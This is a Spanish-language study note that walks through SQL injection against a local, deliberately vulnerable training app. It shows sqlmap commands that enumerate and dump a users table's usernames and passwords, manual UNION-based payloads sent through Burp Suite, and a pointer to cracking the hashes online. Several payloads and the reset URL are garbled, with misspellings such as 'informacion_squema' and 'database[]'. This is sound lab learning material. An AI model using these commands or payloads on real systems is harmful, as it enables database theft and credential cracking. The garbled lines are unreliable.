## Herramientas
- [[sqlmap]]
- [[burpsuite]]

## De forma automatica
- Para esto te clonas el repo de [[SQLinjection-training-app]] y preparamos el ambiente
```bash
git clone https://github.com/appsecco/sqlinjection-training-app
cd sqlinjection-training-app
docker compose up
```
- En el navegador http://localhost:8000.resetdb.php, luego vamos a home y por ultimo hacia algun ejercicio
- En algun buscador mediante BurpSuite interceptamos la comunicacion y guardamos la peticion en un archivo
- Para usar luego sqlmap
```bash
sqlmap -r request.req -p searchitem --batch
```
- Esta instruccion te devuelve informacion sobre si es vulnerable y de que forma
```bash
sqlmap -r request.req -p searchitem --batch --dbs
```
- Esta esta mas dirigida hacia las bases de datos
- Para obtener tablas de una determinada base de datos, en este caso sqltraining:
```bash
sqlmap -r request.req -p searchitem --batch -D sqltraining --tables
```
- Para obtener las columnas de una tabla, en este caso users:
```bash
sqlmap -r request.req -p searchitem --batch -D sqltraining -T users --columns
```
- Para obtener valores de las columnas
```bash
sqlmap -r request.req -p searchitem --batch -D sqltraining -T users -C username,password --dump
```

## De forma manual
- Utilizando BurpSuite e inteceptando la comunicacion entre el envio de una busqueda y la base de datos enviamos datos diferentes, testeando diversas queries, para este caso en particular:
```
searchitem=test' order by 100-- -
searchitem=test' union select 1,2,database[],4,5-- -
searchitem=test' union select 1,2,user[],4,5-- -
searchitem=test' union select 1,2,schema_name[],4,5 from informacion_squema.squemata-- -
searchitem=test' union select 1,2,table_name[],4,5 from informacion_squema.tables where table_squema='sqltraining'-- -
searchitem=test' union select 1,2,column_name[],4,5 from informacion_squema.columns where table_squema='sqltraining' and table_name='users'-- -
searchitem=test' union select 1,username,password,4,5 from users-- -
```
- De la ultima instruccion salen los usernames y las contrasenias cifradas, copias eso y luego en [hashes.com](https://hashes.com) las colocas para descifrarlas